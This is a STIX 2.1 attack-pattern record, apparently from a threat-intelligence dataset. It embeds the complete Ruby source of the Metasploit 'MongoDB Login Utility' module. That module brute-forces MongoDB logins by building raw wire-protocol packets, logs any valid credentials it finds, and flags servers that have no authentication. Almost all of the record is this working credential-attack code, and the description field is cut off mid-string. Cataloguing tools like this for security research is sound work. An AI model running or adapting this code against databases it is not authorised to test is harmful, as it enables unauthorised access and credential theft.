{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d7bcc06-1657-47a2-b00e-e766fc860047",
    "created": "2024-08-14T16:27:24.251252Z",
    "modified": "2024-08-14T16:27:24.251258Z",
    "name": "MongoDB Login Utility",
    "description": " This module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mongodb/mongodb_login.rb",
            "external_id": "mongodb_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'         => 'MongoDB Login Utility',\n      'Description'  => %q{\n        This module attempts to brute force authentication credentials for MongoDB.\n        Note that, by default, MongoDB does not require authentication.\n      },\n      'References'     =>\n        [\n          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],\n          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ]\n        ],\n      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],\n      'License'      => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(27017),\n        OptString.new('DB', [ true, \"Database to use\", \"admin\"])\n      ])\n  end\n\n  def run_host(ip)\n    print_status(\"Scanning IP: #{ip.to_s}\")\n    begin\n      connect\n      if require_auth?\n        each_user_pass { |user, pass|\n          do_login(user, pass)\n        }\n      else\n        report_vuln(\n          :host         => rhost,\n          :port         => rport,\n          :name         => \"MongoDB No Authentication\",\n          :refs         => self.references,\n          :exploited_at => Time.now.utc,\n          :info         => \"Mongo server has no authentication.\"\n        )\n        print_good(\"Mongo server #{ip.to_s} doesn't use authentication\")\n      end\n      disconnect\n    rescue ::Exception => e\n      print_error \"Unable to connect: #{e.to_s}\"\n      return\n    end\n  end\n\n  def require_auth?\n    request_id = Rex::Text.rand_text(4)\n    packet =  \"\\x3f\\x00\\x00\\x00\"   # messageLength (63)\n    packet << request_id           # requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   # responseTo\n    packet <<  \"\\xd4\\x07\\x00\\x00\"  # opCode (2004 OP_QUERY)\n    packet << \"\\x00\\x00\\x00\\x00\"   # flags\n    packet << \"\\x61\\x64\\x6d\\x69\\x6e\\x2e\\x24\\x63\\x6d\\x64\\x00\" # fullCollectionName (admin.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   # numberToSkip (0)\n    packet << \"\\x01\\x00\\x00\\x00\"   # numberToReturn (1)\n    # query ({\"listDatabases\"=>1})\n    packet << \"\\x18\\x00\\x00\\x00\\x10\\x6c\\x69\\x73\\x74\\x44\\x61\\x74\\x61\\x62\\x61\\x73\\x65\\x73\\x00\\x01\\x00\\x00\\x00\\x00\"\n\n    sock.put(packet)\n    response = sock.recv(1024)\n\n    have_auth_error?(response)\n  end\n\n  def do_login(user, password)\n    vprint_status(\"Trying user: #{user}, password: #{password}\")\n    nonce = get_nonce\n    status = auth(user, password, nonce)\n    return status\n  end\n\n  def auth(user, password, nonce)\n    request_id = Rex::Text.rand_text(4)\n    packet =  request_id           # requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   # responseTo\n    packet <<  \"\\xd4\\x07\\x00\\x00\"  # opCode (2004 OP_QUERY)\n    packet << \"\\x00\\x00\\x00\\x00\"   # flags\n    packet << datastore['DB'] + \".$cmd\" + \"\\x00\" # fullCollectionName (DB.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   # numberToSkip (0)\n    packet << \"\\xff\\xff\\xff\\xff\"   # numberToReturn (1)\n\n    #{\"authenticate\"=>1.0, \"user\"=>\"root\", \"nonce\"=>\"94e963f5b7c35146\", \"key\"=>\"61829b88ee2f8b95ce789214d1d4f175\"}\n    document =  \"\\x01\\x61\\x75\\x74\\x68\\x65\\x6e\\x74\\x69\\x63\\x61\\x74\\x65\"\n    document << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x3f\\x02\\x75\\x73\\x65\\x72\\x00\"\n    document << [user.length + 1].pack(\"L\") # +1 due null byte termination\n    document << user + \"\\x00\"\n    document << \"\\x02\\x6e\\x6f\\x6e\\x63\\x65\\x00\\x11\\x00\\x00\\x00\"\n    document << nonce + \"\\x00\"\n    document << \"\\x02\\x6b\\x65\\x79\\x00\\x21\\x00\\x00\\x00\"\n    document << Rex::Text.md5(nonce + user + Rex::Text.md5(user + \":mongo:\" + password)) + \"\\x00\"\n    document << \"\\x00\"\n    # Calculate document length\n    document.insert(0, [document.length + 4].pack(\"L\"))\n\n    packet += document\n\n    # Calculate messageLength\n    packet.insert(0, [(packet.length + 4)].pack(\"L\"))  #messageLength\n    sock.put(packet)\n    response = sock.recv(1024)\n    unless have_auth_error?(response)\n      print_good(\"#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'mongodb',\n        user: user,\n        password: password,\n        proof: response.inspect\n      )\n      return :next_user\n    end\n\n    return\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def get_nonce\n    request_id = Rex::Text.rand_text(4)\n    packet =  \"\\x3d\\x00\\x00\\x00\"   # messageLength (61)\n    packet << request_id           # requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   # responseTo\n    packet <<  \"\\xd4\\x07\\x00\\x00\"  # opCode (2004 OP_QUERY)\n    packet << \"\\x00\\x00\\x00\\x00\"   # flags\n    packet << \"\\x74\\x65\\x73\\x74\\x2e\\x24\\x63\\x6d\\x64\\x00\" # fullCollectionName (test.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   #numberToSkip (0)\n    packet << \"\\x01\\x00\\x00\\x00\"   #numberToReturn (1)\n    # query {\"getnonce\"=>1.0}\n    packet << \"\\x17\\x00\\x00\\x00\\x01\\x67\\x65\\x74\\x6e\\x6f\\x6e\\x63\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x3f\\x00\"\n\n    sock.put(packet)\n    response = sock.recv(1024)\n    documents = response[36..1024]\n    #{\"nonce\"=>\"f785bb0ea5edb3ff\", \"ok\"=>1.0}\n    nonce = documents[15..30]\n  end\n\n  def have_auth_error?(response)\n    # Response header 36 bytes long\n    documents = response[36..1024]\n    #{\"errmsg\"=>\"auth fails\", \"ok\"=>0.0}\n    #{\"errmsg\"=>\"need to login\", \"ok\"=>0.0}\n    if documents.include?('errmsg')\n      return true\n    else\n      return false\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Gregory Man <man.gregory[at]gmail.com> ]",
        ""
    ]
}